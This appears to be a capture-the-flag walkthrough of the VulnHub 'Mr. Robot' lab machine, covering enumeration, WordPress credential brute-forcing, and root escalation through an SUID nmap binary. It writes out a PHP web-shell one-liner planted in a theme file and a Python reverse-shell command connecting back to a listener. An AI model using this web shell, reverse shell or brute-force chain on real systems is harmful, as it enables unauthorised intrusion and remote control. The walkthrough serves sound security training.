Hello Again! I am starting a series of writeups in which I'll cover walkthroughs of VulnHub machines. The difficulties will range from Easy to Hard.

## Task 1: **Intro**

___

> Note: This machine is based on the popular TV show Mr. Robot. It is an easy-medium level boot2root challenge. It has three hidden keys that we need to find. 

## Task 2: **Network and Host Enumeration**
___

The first thing we need to do is to find the ip address assigned to the vulnerable machine. To find that, I'll use **netdiscover**.

```bash
netdiscover -i [interface]
```

Once we get the ip address, we have to enumerate the machine for open ports.

## Task 3: **Web Enumeration**

From the results of the nmap, we discover that 2 ports are open among 3. We'll see what is running on port 80 by visiting the site. It is running some mr-robot styled shell. We can find the directories and files found on the webserver by using ```gobuster```, ```dirb``` or perhaps ```nikto```.

It looks like we have found our first key and a .dic file.

Let's find out the contents of the fsocity.dic file.

![fsoc.dic](/assets/img/vulnhub/mrrobot/3.png)

Seems like it contains a wordlist. Upon further investigation we find that it contains duplicate entries so we'll just remove the repetitions and leave the unique entries so it takes less time to bruteforce.

During directory enumeration we found another interesting page on the webserver ```/wp-login.ph```. It indicates that the server is running wordpress. 

![wp-login](/assets/img/vulnhub/mrrobot/4.png)

We neither know the username nor the password but we are given a wordlist, so we use it to bruteforce the ```username``` and ```password``` field.
___

## Task 4: **Web Exploitation**

I used burpsuite's Intruder tab to first to find a valid ```username```. Remember to put $ sign around the ```username``` field so the payload is placed here.

![brute-burp](/assets/img/vulnhub/mrrobot/5.png)

**NOTE:** First check what the login form returns on unsuccessful attempts, so we set that error message inside payload error section, so when the correct username is found we stop the intruder from further attempts.

![username-found](/assets/img/vulnhub/mrrobot/6.png)

Notice the length of the response on correct username (```Elliot```) is noticeably different from the failed attempts. Other than that, sometimes the status code, and error messages also tell us when we hit the correct payload.

Now that we have the username, I'll use hydra to bruteforce the ```password``` field.

![command](/assets/img/vulnhub/mrrobot/8.png)
![password-found](/assets/img/vulnhub/mrrobot/9.png)

Hurrah! we have found the password: ```ER28-0652```

Let's enter the credentials in the login page.

## Task 5: **Template archive.php**

We have to upload a payload to start a reverse shell. Navigate to **Appearance->Editor->archive.php**, and paste the following.

```bash
<?php passthru($_GET["cmd"]); ?>
```

This one-liner command creates a web shell. It gets the command from ```cmd``` parameter from the URL query string and passes it to ```passthru``` which executes system commands.

![command](/assets/img/vulnhub/mrrobot/11.png)

Use netcat to listen on anyport, 4444 in my case.

```bash
nc -lvnp 4444
```

We'll visit the ```http://192.168.43.216/wp-includes/themes/TwentyFifteen/archive.php?cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((“10.0.0.1”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’``` site in the browser which will spawn an interactive shell (reverse shell).

![rev-shell](/assets/img/vulnhub/mrrobot/12.png)

We are currently logged in as ```daemon```. Do

```bash
ls -la
```

It'll output an ```md5``` hash file and 2nd key. We can not see the 2nd key because only user ```robot``` has the permission to view the file. So we need to escalate privileges. 

The ```md5``` hash contains the password for user ```robot``` so we put that hash into [Crackstation](https://crackstation.net/). The password is

![robot-passwd](/assets/img/vulnhub/mrrobot/13.png)

Login as user ```robot``` and view the 2nd key.

#### Flag 2 of 3: 822c73956184f694993bede3eb39f959

## Task 6: **Privilege Escalation - Getting root**

The third key resides inside ```/root```, so we need to switch to root. For that we first search for files with ```SUID (Set User ID)``` permissions set. Execute the following command which will do it.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

![nmap-suid](/assets/img/vulnhub/mrrobot/15.png)

We need command execution as superuser, so we find nmap interesting here, further we go to [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#sudo) to abuse this behaviour.

![robot-passwd](/assets/img/vulnhub/mrrobot/16.png)

Execute the commands one by one and we finally get a shell as root. 

![root](/assets/img/vulnhub/mrrobot/18.png)

Navigate to ```/root/key-3-of-3.txt``` to get the 3rd and final key.
